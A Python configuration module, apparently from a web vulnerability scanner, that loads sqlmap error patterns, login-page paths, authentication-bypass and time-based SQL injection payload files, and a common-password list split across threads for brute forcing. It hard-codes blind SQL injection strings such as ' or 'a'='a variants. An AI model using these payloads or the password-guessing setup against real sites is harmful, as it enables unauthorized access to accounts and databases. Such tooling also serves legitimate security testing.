import xml.etree.ElementTree as ET
import os
import math
home_path = os.path.dirname(__file__)
payloads_path = os.path.join(home_path,"payloads")
results_path = os.path.join(home_path,"results")
errors_xml = os.path.join(payloads_path,"errors.xml")
login_pages_txt = os.path.join(payloads_path, "login_pages.txt")
auth_bypass_payloads_txt = os.path.join(payloads_path, "authbypass.txt")
time_payloads_txt = os.path.join(payloads_path, "time_payloads.txt")
time_payloads_or_txt = os.path.join(payloads_path, "time_payloads_or.txt")
common_passwords_txt = os.path.join(payloads_path, "common_passwords.txt")

# http_proxy = "http://127.0.0.1:8080"
# https_proxy = "https://127.0.0.1:8080"
http_proxy = ""
https_proxy = ""

max_response_size = 1024 * 1024 * 4 # MB -> max response
timeout = 5
crawl_pages = 300

number_of_threads = 4
number_of_processes = 4

user_agent = 'Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0'
headers = {'User-Agent': user_agent}

# read errors.xml(sqlmap) and store to sql_errors dictionary
root = ET.parse(errors_xml).getroot()
sql_errors = {}
for dbms in root:
    # print(dbms.tag,dbms.attrib["value"])
    dbms_name = dbms.attrib["value"]
    list_errors = []
    for er in dbms:
        regex = er.attrib["regexp"]
        list_errors.append(regex)
    sql_errors[dbms_name]=list_errors

# read login/admin pages lists
fh = open(login_pages_txt, "r")
loginPages = fh.readlines()
loginPages = [x.strip() for x in loginPages]
fh.close()

fh = open(auth_bypass_payloads_txt, "r")
auth_bypass_payloads = fh.readlines()
auth_bypass_payloads = [x.rstrip() for x in auth_bypass_payloads]

fh.close()

fh = open(time_payloads_txt, "r")
payloads_time = fh.readlines()
payloads_time = [x.rstrip() for x in payloads_time]
fh.close()

fh = open(common_passwords_txt, "r")
common_passwords = fh.readlines()
common_passwords = [x.rstrip() for x in common_passwords]
fh.close()

payload_blind_sqli_and_1 = [" and 1=1","' and 'a'='a","\" and \"a\"=\"a","') and ('a'='a","\") and (\"a\"=\"a","')) and (('a'='a","\")) and ((\"a\"=\"a"]
payload_blind_sqli_and_2 = [" and 1=2","' and 'a'='b","\" and \"a\"=\"b","') and ('a'='b","\") and (\"a\"=\"b","')) and (('a'='b","\")) and ((\"a\"=\"b"]

payload_blind_sqli_or_1 = [" or 1=1","' or 'a'='a","\" or \"a\"=\"a","') or ('a'='a","\") or (\"a\"=\"a","')) or (('a'='a","\")) or ((\"a\"=\"a"]
payload_blind_sqli_or_2 = [" or 1=2","' or 'a'='b","\" or \"a\"=\"b","') or ('a'='b","\") or (\"a\"=\"b","')) or (('a'='b","\")) or ((\"a\"=\"b"]

# passwords for threads
total_count = len(common_passwords)
pass_for_single_thread = math.ceil(total_count / number_of_threads)
common_passwords_thread = []
for i in range(0, number_of_threads - 1):
    s = i * pass_for_single_thread
    e = ((i + 1) * pass_for_single_thread)
    common_passwords_thread.append(common_passwords[s:e])

s = (number_of_threads - 1) * pass_for_single_thread  # to cover boundry condition
common_passwords_thread.append(common_passwords[s:])

